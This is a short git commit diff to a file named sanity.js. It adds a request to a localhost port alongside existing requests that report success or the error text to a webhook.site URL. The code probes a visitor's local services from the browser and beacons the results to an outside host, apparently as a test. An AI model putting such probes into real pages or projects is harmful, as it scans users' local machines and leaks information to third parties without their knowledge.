2e94261c8b5de8a3bd7cf13c0664452a41582b36
codefeasto <87825522+codefeasto@users.noreply.github.com>
2023-08-17 13:22:17 +0300

    Update sanity.js

--- sanity.js
+++ sanity.js
@@ -1,4 +1,5 @@
 try{
+  var a = await fetch("https://localhost:1024/");
   await fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?",{"mode":"cors"});
 }catch(err){
   await  fetch("https://webhook.site/695fb972-c378-4986-b7af-0e8080af2eb8?"+err,{"mode":"cors"});
